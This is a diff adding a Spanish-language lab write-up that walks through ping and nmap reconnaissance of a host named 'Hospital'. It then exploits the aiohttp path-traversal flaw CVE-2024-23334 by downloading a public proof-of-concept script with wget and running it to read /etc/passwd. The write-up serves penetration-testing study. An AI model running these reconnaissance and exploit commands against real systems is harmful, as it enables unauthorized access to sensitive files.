@@ -106,3 +106,86 @@ Tras obtener acceso inicial en cada máquina, se procede directamente al:
 
 - Establecimiento de túneles  
 - Movimiento lateral hacia el siguiente objetivo  
+
+
+# Reconocimiento inicial (máquina “Hospital”, 10.10.10.2)
+
+Se inicia el reconocimiento mediante un ping a la máquina. Esto se hace por un lado para detectar que la máquina se encuentra accesible y por otro lado para poder detectar el sistema operativo mediante el TTL asignado.
+
+```
+ping -c 1 10.10.10.2
+```
+
+<img width="542" height="140" alt="image" src="https://github.com/user-attachments/assets/cef1e452-c001-44f3-9c47-70597eebf88b" />
+
+Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux.
+
+Una vez hecho esto, se realiza un reconocimiento de los servicios disponibles en dos fases. En la primera, se realiza un escaneo de todos los puertos TCP usando nmap para detectar en primera instancia cuales de ellos son accesibles (open), utilizando un escaneo TCP SYN.
+
+```ruby
+sudo nmap -sS -p- --min-rate 1000 -n -Pn 10.10.10.2 -oN allPorts
+```
+<img width="520" height="280" alt="image" src="https://github.com/user-attachments/assets/beb731d2-1508-49f1-af4b-d1b5651a5092" />
+
+En la segunda, se realiza un reconocimiento básico de los servicios subyacentes también mediante el uso de nmap. Esta vez, realizando dicha tarea de reconocimiento únicamente en los puertos detectados como abiertos.
+
+```ruby
+nmap -sCV -p 22,80,5000 -n -Pn 10.10.10.2 -oN services
+```
+
+<img width="826" height="341" alt="image" src="https://github.com/user-attachments/assets/42bff05a-f0cc-4e6d-b7ee-9c281ff39d4e" />
+
+En este caso, se omite el escaneo de puertos UDP, ya que para esta máquina en particular no tiene ningún servicio relevante para llevar a cabo el ejercicio.
+
+## 🚪 Acceso Inicial — drzunder (Máquina "Hospital" | 10.10.10.2)
+
+### 🔍 Enumeración de Servicios
+
+Durante la fase de reconocimiento inicial, se identificaron los siguientes puertos abiertos en el objetivo:
+
+- **22/tcp** → Servicio SSH (*OpenSSH*)  
+- **80/tcp** → Servicio HTTP (*Apache*)  
+- **5000/tcp** → Servicio HTTP (*aiohttp 3.9.1*)  
+
+Adicionalmente, mediante fingerprinting de servicios, se determinó que el sistema operativo subyacente es **Ubuntu**.
+
+---
+
+### ⚠️ Identificación de Vulnerabilidad
+
+Tras analizar los servicios expuestos, se detectó que la aplicación web ejecutándose en el puerto **5000** es vulnerable a una **lectura arbitraria de archivos (LFI)**, correspondiente a la siguiente vulnerabilidad:
+
+- **CVE-2024-23334**
+
+Esta vulnerabilidad permite a un atacante acceder a archivos locales del sistema sin necesidad de autenticación, lo que resulta crítico en escenarios de post-explotación y recolección de credenciales.
+
+---
+
+### 🧨 Explotación
+
+Se identificó un **Proof of Concept (PoC)** funcional disponible públicamente, el cual permite explotar la vulnerabilidad de forma directa:
+
+- 🔗 CVE: https://nvd.nist.gov/vuln/detail/CVE-2024-23334  
+- 🔗 Exploit: https://github.com/s4botai/CVE-2024-23334-PoC  
+
+Una vez descargado el exploit, se procedió a su ejecución para validar la vulnerabilidad mediante la lectura del archivo `/etc/passwd`.
+
+```bash
+wget https://raw.githubusercontent.com/s4botai/CVE-2024-23334-PoC/refs/heads/main/lfi.sh
+chmod +x lfi.sh
+./lfi.sh -u http://10.10.10.2:5000/static/index.html -f /etc/passwd
+``` id="exploit-lfi"
+
+---
+
+### 📌 Resultado
+
+La explotación fue exitosa, permitiendo la lectura de archivos locales del sistema objetivo. Esto confirma:
+
+- La existencia de la vulnerabilidad LFI  
+- La capacidad de acceder a información sensible  
+- Un punto de apoyo inicial para continuar con la intrusión  
+
+Este vector será clave para la obtención de credenciales y el posterior acceso al sistema a través de otros servicios como SSH.
+
+---
